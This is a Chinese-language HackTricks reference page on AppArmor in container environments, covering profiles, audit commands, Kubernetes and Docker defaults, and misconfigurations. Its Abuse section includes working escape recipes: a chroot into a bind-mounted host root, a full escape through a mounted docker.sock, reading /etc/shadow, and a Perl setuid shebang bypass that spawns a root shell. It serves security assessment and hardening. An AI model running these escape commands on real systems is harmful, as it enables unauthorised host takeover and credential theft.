# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## 概述

AppArmor 是一种**强制访问控制**系统，通过针对每个程序的 profile 施加限制。与高度依赖用户和组所有权的传统 DAC 检查不同，AppArmor 允许内核强制执行附加到进程本身的策略。在 container 环境中，这一点很重要，因为 workload 可能拥有足够的传统权限来尝试某项操作，但仍会因为其 AppArmor profile 不允许访问相关 path、执行 mount、进行 network 操作或使用某项 capability 而被拒绝。

最重要的概念是，AppArmor 是**基于 path 的**。它通过 path rules 判断 filesystem access，而不是像 SELinux 那样通过 labels 进行判断。这使其易于理解且功能强大，但也意味着 bind mounts 和其他 path 布局需要特别注意。如果同一份 host content 可以通过不同的 path 访问，策略的实际效果可能与 operator 最初预期的不同。

## 在 Container Isolation 中的作用

Container security review 通常会在检查 capabilities 和 seccomp 后停止，但 AppArmor 在这些检查完成后仍然很重要。设想一个 container 拥有超出应有范围的 privilege，或者某个 workload 因为 operational 原因需要额外的一项 capability。AppArmor 仍然可以限制 file access、mount 行为、networking 以及 execution patterns，从而阻止明显的 abuse path。这也是为什么为了“让 application 正常工作”而禁用 AppArmor，可能会悄然将一个仅存在风险的 configuration 转变为一个可被主动利用的 configuration。

## Lab

要检查 host 上的 AppArmor 是否处于 active 状态，请使用：
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
要查看当前容器进程所运行的身份：
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
这种差异很有说明性。在正常情况下，进程应显示与 runtime 选择的 profile 关联的 AppArmor 上下文。而在 unconfined 情况下，这一额外的限制层会消失。

你还可以检查 Docker 认为自己应用了什么：
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Runtime 使用

当主机支持 AppArmor 时，Docker 可以应用默认或自定义的 AppArmor profile。Podman 也可以在基于 AppArmor 的系统上与 AppArmor 集成，不过在以 SELinux 为主的发行版中，通常由另一套 MAC 系统发挥主要作用。Kubernetes 可以在实际支持 AppArmor 的节点上，以 workload 级别公开 AppArmor policy。LXC 及相关的 Ubuntu 系统容器环境也广泛使用 AppArmor。

实际要点是，AppArmor 并不是一个“Docker 功能”。它是主机内核功能，多个 runtime 都可以选择应用它。如果主机不支持 AppArmor，或者 runtime 被要求以 unconfined 模式运行，那么所谓的保护实际上并不存在。

对于 Kubernetes，现代 API 是 `securityContext.appArmorProfile`。自 Kubernetes `v1.30` 起，旧版 beta AppArmor annotations 已被弃用。在受支持的主机上，`RuntimeDefault` 是默认 profile，而 `Localhost` 指向一个必须已经在节点上加载的 profile。这一点在 review 期间很重要，因为某个 manifest 可能看起来支持 AppArmor，但实际上仍完全依赖节点端支持和预加载的 profiles。<sup>[[1]](#references)</sup>

一个微妙但有用的运维细节是，显式设置 `appArmorProfile.type: RuntimeDefault` 比直接省略该字段更加严格。如果显式设置了该字段，而节点不支持 AppArmor，admission 应当失败。如果省略该字段，workload 仍可能在不支持 AppArmor 的节点上运行，只是不会获得这一额外的 confinement layer。从攻击者的角度来看，这也是同时检查 manifest 和实际节点状态的一个重要原因。<sup>[[1]](#references)</sup>

在支持 Docker 的 AppArmor 主机上，最知名的默认 profile 是 `docker-default`。该 profile 根据 Moby 的 AppArmor template 生成，这一点很重要，因为它解释了为什么某些基于 capability 的 PoC 在默认 container 中仍然会失败。概括来说，`docker-default` 允许普通 networking，拒绝对大部分 `/proc` 的写入，拒绝访问 `/sys` 中的敏感部分，阻止 mount 操作，并限制 ptrace，使其无法作为通用的主机探测原语。理解这一 baseline 有助于区分“container 拥有 `CAP_SYS_ADMIN`”与“container 实际上可以利用该 capability 访问我所关注的内核接口”。

## Profile 管理

AppArmor profiles 通常存储在 `/etc/apparmor.d/` 下。常见的命名约定是将可执行文件路径中的斜杠替换为点。例如，`/usr/bin/man` 的 profile 通常存储为 `/etc/apparmor.d/usr.bin.man`。这一细节对于防御和 assessment 都很重要，因为一旦知道 active profile 的名称，通常就能在主机上快速找到对应的文件。

有用的主机端管理命令包括：
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
这些命令之所以在 container-security 参考资料中很重要，是因为它们说明了 profile 实际上是如何构建、加载、切换到 complain mode，以及在应用程序发生变化后进行修改的。如果操作员习惯于在故障排除期间将 profile 切换到 complain mode，却忘记恢复 enforcement，那么容器在文档中看起来可能受到保护，但实际上运行得宽松得多。

### 构建和更新 Profile

`aa-genprof` 可以观察应用程序的行为，并以交互方式帮助生成 profile：
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` 可以生成一个模板 profile，之后可使用 `apparmor_parser` 加载：
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
当二进制文件发生变化且需要更新 policy 时，`aa-logprof` 可以重放日志中发现的拒绝事件，并协助 operator 决定是否允许或拒绝这些操作：
```bash
sudo aa-logprof
```
### 日志

AppArmor 的拒绝事件通常可以通过 `auditd`、syslog 或 `aa-notify` 等工具查看：
```bash
sudo aa-notify -s 1 -v
```
这在 operational 上和 offensively 都很有用。Defenders 使用它来完善 profiles。Attackers 使用它来了解具体是哪个 path 或 operation 被拒绝，以及 AppArmor 是否是阻止 exploit chain 的控制机制。

### 识别确切的 Profile 文件

当 runtime 为某个 container 显示特定的 AppArmor profile 名称时，通常可以将该名称映射回磁盘上的 profile 文件：
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
这在 host-side review 期间尤其有用，因为它弥合了“container 声称自己运行在 `lowpriv` profile 下”和“实际 rules 位于这个可审计或重新加载的特定文件中”之间的差距。

### 需要审计的高信号 Rules

当你能够读取一个 profile 时，不要只关注简单的 `deny` 行。几类 rule type 会实质性地改变 AppArmor 针对 container escape attempt 的防护效果：<sup>[[2]](#references)</sup>

- `ux` / `Ux`：以 unconfined 状态执行目标 binary。如果某个可访问的 helper、shell 或 interpreter 被允许使用 `ux`，通常应首先测试这一点。
- `px` / `Px` 和 `cx` / `Cx`：在 exec 时执行 profile transitions。这些并非自动意味着存在问题，但值得审计，因为 transition 可能会进入比当前 profile 宽松得多的 profile。
- `change_profile`：允许 task 切换到另一个已加载的 profile，可以立即切换，也可以在下一次 exec 时切换。如果目标 profile 更弱，这可能成为从 restrictive domain 中预设的 escape hatch。
- `flags=(complain)`、`flags=(unconfined)` 或较新的 `flags=(prompt)`：这些选项会改变你对该 profile 的信任程度。`complain` 会记录 denials 而不是强制执行，`unconfined` 会移除 boundary，而 `prompt` 依赖 userspace decision path，而不是完全由 kernel 强制 deny。
- `userns` 或 `userns create,`：较新的 AppArmor policy 可以对 user namespaces 的创建进行 mediation。如果某个 container profile 明确允许该操作，那么即使 platform 将 AppArmor 作为 hardening strategy 的一部分，nested user namespaces 仍然可用。

Useful host-side grep：
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
这种审计通常比盯着数百条普通文件规则更有用。如果一次 breakout 依赖于执行 helper、进入新的 namespace，或逃逸到限制更少的 profile，那么答案往往隐藏在这些面向 transition 的规则中，而不是明显的 `deny /etc/shadow r` 风格行里。

## Misconfigurations

最明显的错误是 `apparmor=unconfined`。管理员经常在调试应用时设置它，因为 profile 正确地阻止了某些危险或意外的操作。如果该标志保留在 production 中，整个 MAC layer 实际上就被移除了。

另一个隐蔽问题是认为 bind mounts 没有危害，因为文件权限看起来正常。由于 AppArmor 基于路径工作，将 host paths 暴露在替代的 mount locations 下，可能会与 path rules 产生不良交互。第三个错误是忘记了：配置文件中的 profile name，如果 host kernel 实际上没有 enforcing AppArmor，那么它几乎没有意义。

## Abuse

当 AppArmor 消失后，之前受限的操作可能会突然成功：通过 bind mounts 读取敏感路径，访问原本应该更难使用的 procfs 或 sysfs 部分，在 capabilities/seccomp 也允许的情况下执行与 mount 相关的操作，或使用 profile 通常会拒绝的路径。AppArmor 往往是解释为什么一次基于 capability 的 breakout 尝试在理论上“应该成功”，但在实践中仍然失败的机制。移除 AppArmor 后，同样的尝试可能开始成功。

如果你怀疑 AppArmor 是阻止 path-traversal、bind-mount 或基于 mount 的 abuse chain 的主要因素，第一步通常是比较存在 profile 和不存在 profile 时哪些内容变得可访问。例如，如果某个 host path 被挂载到 container 内，首先检查你是否能够遍历并读取它：
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
如果容器还具有 `CAP_SYS_ADMIN` 等危险 capability，那么最实用的测试之一，就是检查 AppArmor 是否是阻止 mount 操作或访问敏感内核文件系统的控制机制：
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
在主机路径已通过 bind mount 可用的环境中，失去 AppArmor 还可能将只读信息泄露问题转变为直接访问主机文件：
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
这些命令的重点并不是 AppArmor 单独造成了 breakout，而是移除 AppArmor 后，许多基于 filesystem 和 mount 的滥用路径会立即变得可测试。

### 完整示例：AppArmor Disabled + Host Root Mounted

如果容器已经将 host root bind-mounted 到 `/host`，移除 AppArmor 可能会将一条受阻的 filesystem 滥用路径转变为完整的 host escape：
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
一旦 shell 通过主机文件系统执行，工作负载实际上就已经逃逸出容器边界：
```bash
id
hostname
cat /etc/shadow | head
```
### 完整示例：AppArmor 已禁用 + Runtime Socket

如果真正的防护屏障是围绕 runtime 状态的 AppArmor，那么挂载的 socket 就足以实现完整逃逸：
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
具体路径取决于 mount point，但最终结果相同：AppArmor 不再阻止对 runtime API 的访问，而 runtime API 可以启动一个能够 compromize host 的 container。

### 完整示例：基于路径的 Bind-Mount Bypass

由于 AppArmor 基于路径进行保护，保护 `/proc/**` 并不会自动保护通过其他路径可访问的相同 host procfs 内容：
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
具体影响取决于实际挂载的内容，以及备用路径是否也绕过了其他控制措施，但这一模式清楚地说明了，必须结合 mount layout 评估 AppArmor，而不能孤立地进行评估。

### 完整示例：Shebang Bypass

AppArmor policy 有时会以一种未充分考虑通过 shebang 处理执行 script 的方式，针对某个 interpreter path。一个历史示例涉及使用一个首行指向受限 interpreter 的 script：<sup>[[3]](#references)</sup>
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
这种示例很重要，因为它提醒我们：profile 意图与实际执行语义可能存在差异。在 container 环境中审查 AppArmor 时，应特别关注 interpreter chains 和 alternate execution paths。

## 检查

这些检查的目标是快速回答三个问题：主机上是否启用了 AppArmor、当前进程是否受到限制，以及 runtime 是否确实为此 container 应用了 profile。
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
这里有几点值得关注：

- 如果 `/proc/self/attr/current` 显示 `unconfined`，说明该 workload 没有受益于 AppArmor confinement。
- 如果 `aa-status` 显示 AppArmor 已禁用或未加载，那么 runtime config 中的任何 profile 名称基本上都只是装饰。
- 如果 `docker inspect` 显示 `unconfined` 或意外的 custom profile，这通常就是 filesystem 或 mount-based abuse path 能够奏效的原因。
- 如果 `/sys/kernel/security/apparmor/profiles` 不包含你预期的 profile，仅靠 runtime 或 orchestrator configuration 是不够的。
- 如果一个 supposedly hardened profile 包含 `ux`、宽泛的 `change_profile`、`userns` 或 `flags=(complain)` 风格的规则，那么实际的安全边界可能远弱于 profile 名称所暗示的程度。

如果一个 container 已经因 operational reasons 拥有 elevated privileges，那么继续启用 AppArmor 往往决定了这只是一个受控例外，还是一次范围更广的 security failure。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 在支持 AppArmor 的 host 上默认启用 | 除非被覆盖，否则使用 `docker-default` AppArmor profile | `--security-opt apparmor=unconfined`、`--security-opt apparmor=<profile>`、`--privileged` |
| Podman | 取决于 host | AppArmor 可通过 `--security-opt` 支持，但具体 default 取决于 host/runtime，并不像 Docker 文档中的 `docker-default` profile 那样通用 | `--security-opt apparmor=unconfined`、`--security-opt apparmor=<profile>`、`--privileged` |
| Kubernetes | 有条件的 default | 如果未指定 `appArmorProfile.type`，default 为 `RuntimeDefault`，但只有在 node 上启用 AppArmor 时才会应用 | `securityContext.appArmorProfile.type: Unconfined`、使用 weak profile 的 `securityContext.appArmorProfile.type: Localhost`、不支持 AppArmor 的 node |
| containerd / CRI-O under Kubernetes | 遵循 node/runtime support | 常见的 Kubernetes-supported runtime 支持 AppArmor，但实际 enforcement 仍取决于 node support 和 workload settings | 与 Kubernetes 行相同；direct runtime configuration 也可能完全跳过 AppArmor |

对于 AppArmor 来说，最重要的变量通常是 **host**，而不只是 runtime。manifest 中的 profile setting 并不会在未启用 AppArmor 的 node 上创建 confinement。

## References

- [1] [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
- [3] [HTB: Nunchucks - AppArmor shebang bypass with a Perl script](https://0xdf.gitlab.io/2021/11/02/htb-nunchucks.html)

{{#include ../../../../banners/hacktricks-training.md}}
